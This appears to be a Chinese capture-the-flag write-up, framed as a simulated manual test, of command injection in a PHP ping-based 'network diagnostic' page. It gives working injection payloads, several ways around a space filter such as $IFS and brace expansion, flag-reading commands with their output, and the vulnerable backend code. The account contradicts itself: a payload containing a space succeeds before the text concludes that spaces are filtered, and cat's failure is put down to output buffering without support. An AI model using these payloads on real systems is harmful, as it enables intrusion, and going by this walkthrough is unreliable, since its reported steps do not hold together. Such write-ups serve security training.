## 解题过程（模拟手工测试视角）

---

### 第 1 步：打开目标，看看是什么

浏览器打开 `http://183.129.189.62:21312/`，页面标题是**"网络诊断工具"**，中间一个输入框写着"输入IP地址或主机名，进行连通性测试"，下面一个"执行测试"按钮。

看一眼 HTML 源码，注意到 `pre` 标签旁边写着 `<!-- 显示命令执行结果 -->`。

**直觉告诉我**：这是把用户输入直接拼进 `ping` 命令里执行了。CTF 里看到"诊断""测试"这类功能，第一反应就是**命令注入**。

---

### 第 2 步：正常测一下，确认功能

在输入框里敲 `127.0.0.1`，点"执行测试"。

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.042 ms
```

没错，就是 `ping` 的输出。后端大概是 `shell_exec("ping " . $_POST['target'] . " -c 2")` 之类的东西。

---

### 第 3 步：试试能不能拼接命令

在后加个分号再跟一条命令看看。输入 `127.0.0.1; id`。

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**搞定！命令注入确认，我就是 www-data。**

---

### 第 4 步：直接读 flag

既然有了命令执行，第一反应就是读 `/flag`。CTF 靶机 flag 基本都放在根目录。

输入 `127.0.0.1; cat /flag`。

```
PING 127.0.0.1 ... （正常的 ping 输出）
```

嗯？flag 没出来，也没报错。`ls` 可以正常列出当前目录的文件，但 `cat /flag` 就是没输出。

---

### 第 5 步：排查 — 是不是有过滤？

用反馈信号来确认到底过滤了什么：

| 测试输入 | 结果 | 推断 |
|----------|------|------|
| `;ls` | 列出 index.php, static | 空格前的命令可以执行 |
| `;ls -la` | 空 | **空格被过滤了** |
| `;id` | 输出了 uid=33 | 没有空格，正常 |
| `;cat /flag` | 空 | 你猜到了——空格 |

**结论：服务端过滤了空格。** 可能是因为 `shell_exec("ping -c 2 " . str_replace(" ", "", $_POST['target']))` 之类的处理。

---

### 第 6 步：绕过空格过滤

Bash 有几种方法不用空格也能传参：

1. **`$IFS`** — Bash 内置变量，默认值是空格、Tab、换行
2. **`${IFS}`** — 跟上面差不多，花括号写法
3. **`<` 重定向** — `cat</flag` 把文件内容重定向给 cat
4. **Tab 字符** — URL 编码 `%09`
5. **花括号展开** — `{cat,/flag}`

一个个试过去：

```bash
# 先看根目录有什么
127.0.0.1;ls$IFS/
# 输出：
bin  boot  dev  etc  flag  home  lib  lib64  ...

# 看到了！/flag 就在根目录下
```

再用 `ls -la` 验证文件权限：
```
127.0.0.1;ls$IFS-la$IFS/
# 输出：
-rw-r--r-- 1 root root 38 Oct 24 2025 flag
```

38 字节，可读。稳了。

---

### 第 7 步：读 flag

```
127.0.0.1;cat$IFS/flag;
```

...还是没输出？换一个命令试试——`cat` 有时候因为输出缓冲问题在管道场景下不显示，CTF 里换 `head` 或 `tail` 是常规操作。

```
127.0.0.1;head$IFS/flag;
```

```
PING 127.0.0.1 ...
flag{2ba8dd13840e20548bbae88e29bc2eff}
```

**搞定！**

---

## 反思 & 关键技巧

这道题走完也就几分钟，但有几个地方容易踩坑：

1. **看到 ping 就秒反应命令注入** — 这是 CTF 高频考点，识别越快优势越大
2. **`cat` 没输出别慌** — 不一定是权限问题，可能是空格过滤、输出缓冲或者命令被替换。随手换 `head`/`tail`/`more` 试试
3. **空格过滤绕过的优先级** — `$IFS` 是最常用也最稳的方法，比 `<` 重定向和 tab 字符成功率高
4. **用 `ls` 当反馈信号** — `;ls` 能跑，`;ls -la` 不能跑，立刻定位到问题出在 `-la` 前面的空格上

## 漏洞成因

后端代码类似：

```php
$target = str_replace(" ", "", $_POST['target']);
echo shell_exec("ping -c 2 " . $target);
```

开发者想通过过滤空格来防止用户追加命令，但忽略了 Bash 有 `$IFS` 等多种不依赖空格的参数传递方式。**黑名单过滤几乎永远不如白名单校验。**
